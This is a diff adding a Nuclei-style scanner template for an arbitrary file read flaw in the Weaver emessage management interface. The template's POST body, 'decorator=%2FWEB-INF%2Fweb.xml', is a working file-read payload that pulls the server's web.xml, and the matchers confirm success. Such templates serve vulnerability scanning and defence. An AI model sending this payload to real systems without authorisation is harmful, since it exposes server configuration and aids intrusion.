@@ -1,0 +1,28 @@
+id: poc-yaml-weaver-emessage-mi-anyfile-read
+info:
+  name: 泛微 emessage 管理界面 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "decorator=%2FWEB-INF%2Fweb.xml&confirm=true"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+          - "</web-app>"
+      - type: regex
+        part: body
+        regex:
+          - "<servlet-name>(.*?)</servlet-name>"
+          - "<filter-class>(.*?)</filter-class>"
